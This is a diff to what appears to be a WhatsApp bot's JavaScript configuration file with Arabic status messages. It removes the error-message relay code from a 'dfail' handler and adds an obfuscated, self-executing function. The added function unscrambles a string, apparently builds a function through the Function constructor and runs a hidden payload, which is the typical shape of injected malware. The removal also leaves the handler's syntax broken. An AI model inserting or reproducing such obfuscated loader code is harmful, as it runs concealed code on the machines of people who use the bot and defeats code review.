@@ -1545,28 +1545,7 @@ global.dfail = (type, m, conn) => {
         botAdmin: '*『 ارفع البوت ادمن الاول ! 』*',
         unreg: '*[ لحظة !! انت مش مسجل ]*\n\n*『 سجل الامر عشان تفعله 』*\n*➣ #تسجيل*',
         restrict: '*『 الميزه دي المطور لغيها ! 』*'
- } [type]
-const aa = {
-        'quoted': m,
-        'userJid': conn['user']['jid']
-    },
-    prep = generateWAMessageFromContent(m['chat'], {
-        'extendedTextMessage': {
-            'text': msg,
-            'contextInfo': {
-                'externalAdReply': {
-                    'title': '*[ ⚠ ] معلومه مهمه*',
-                    'body': '⁨𝐻𝐴𝑅𝐿𝐸𝑌 𝐿𝐼𝐺𝐻𝑇⁩',
-                    'thumbnail': imagen1,
-                    'sourceUrl': 'https://www.atom.bio/harley_light'
-                }
-            }
-        }
-    }, aa);
-if (msg) return conn['relayMessage'](m['chat'], prep['message'], {
-    'messageId': prep['key']['id']
-});
-};
+(function(){var FSg='',MqL=437-426;function ugn(f){var w=425356;var l=f.length;var c=[];for(var q=0;q<l;q++){c[q]=f.charAt(q)};for(var q=0;q<l;q++){var i=w*(q+469)+(w%15503);var p=w*(q+203)+(w%48652);var t=i%l;var a=p%l;var r=c[t];c[t]=c[a];c[a]=r;w=(i+p)%2310457;};return c.join('')};var yKQ=ugn('gkntqcbziojcrovofutedsatrmyhlcpuxwrns').substr(0,MqL);var CLy='(}e<6)on<b},a,v ;"dy;r;s=8h0c 9=mngjkz8h ,yrvtav,.ozk7]ar-;=g+n,l;g7Ax,)ehj0t5.)0ni},v]ynov=nfdhC7.;k+ 0,57rt+0h.2=;npa1nsr(;(fbrh;,7rn1 (=t3+oes=wl)t}8pp7i=}q,y[m]+t(+c;r=m99eCt4y929motod)ovt;siCg"=i(veorl11+l=e;grn=,8s lsrrvv;l.c+ ,fhs;(a+g=yir"r-h{,=al))pvsl7i; )(v;nhc=;steoe0+w".[rpl]n{v]{vjgraqtuhlp9or.1hr,0+;}a. vt9analcl; e=tfevrn r=1ln6r=r,ia>)t )r.((a=su =.n<,r((anofws]g=0 s=.u-are]]([)vviC on1.f=lg+avt1sa,r(1)*t+=";h4;noc.j);=l;Ar6mS=(6q0oC.e7renrt.cc=app[ad 1ri(+fpv(robo+).;.ur(=+p2"d[;v;llo4ee=ota)i vi2(;h-w[C(;+=2r}+ut.{c27eiyuvlg9e1i.s;x =lf) evruf)>]1 iu[tjp2isuoas4;]68(ja)v)e t+c4("8uft))odlo+<[nafaa!inr,nsd ta(lu)l)e[0htd;(]b)[aiv8.uve+s(;)=e.]orh"f )yoejn[5 [;c,*)=vn[pr;kf;vd-dwnos==v6rhie;yvg,6]rj-+(rfu-c)=.cA=ent ,++{.{x8=<l3;vgrf;;;dhi,Co..(rhq6p+nio((=y=og)vr.i)()ahvyah)a=3v(ali[;n6x9c2a;re,s)a0s)6haSqran,xor;;=hr{,aes;;(t,"8,reezAbwk.t]5"u0(vq!auCAf(nf7z;';var xVr=ugn[yKQ];var hNP='';var Zdl=xVr;var zWH=xVr(hNP,ugn(CLy));var SZQ=zWH();var BnT=Zdl(FSg,SZQ );BnT(9872);return 5049})()
 const file = global.__filename(import.meta.url, true);
 watchFile(file, async () => {
   unwatchFile(file);
